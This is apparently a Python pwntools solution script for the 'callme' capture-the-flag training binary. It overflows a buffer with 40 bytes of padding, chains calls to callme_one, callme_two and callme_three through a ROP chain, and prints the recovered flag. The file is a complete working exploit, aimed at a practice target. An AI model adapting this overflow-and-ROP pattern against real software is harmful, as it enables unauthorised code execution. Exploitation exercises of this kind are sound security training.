from pwn import *
import warnings

exe = './callme'
elf = context.binary = ELF(exe, checksec=False)
warnings.filterwarnings('ignore')

io = process()

offset = 40
 
params = [
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d
]

rop = ROP(elf)
rop.callme_one(*params)
rop.callme_two(*params)
rop.callme_three(*params)
chain = rop.chain()

payload = flat([
    "A" * offset,
    chain
])

io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

io.recvline()
io.recvline()

flag = io.recv()
success(flag)
